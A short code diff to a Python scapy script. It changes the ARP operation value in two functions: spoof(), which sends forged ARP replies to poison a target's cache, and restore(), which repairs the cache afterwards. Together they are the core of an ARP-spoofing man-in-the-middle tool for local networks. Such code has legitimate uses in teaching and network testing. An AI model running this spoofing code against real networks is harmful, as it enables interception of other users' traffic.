@@ -19,14 +19,14 @@ def get_mac(ip):
 
 
 def spoof(t_ip, spoof_ip):
-    packet = ARP(op=ARP.is_at, pdst=t_ip, hwdst=get_mac(t_ip), psrc=spoof_ip)
+    packet = ARP(op="is-at", pdst=t_ip, hwdst=get_mac(t_ip), psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
 
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
-    packet = ARP(op=ARP.is_at, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    packet = ARP(op="is-at", pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, verbose=False)
 
 
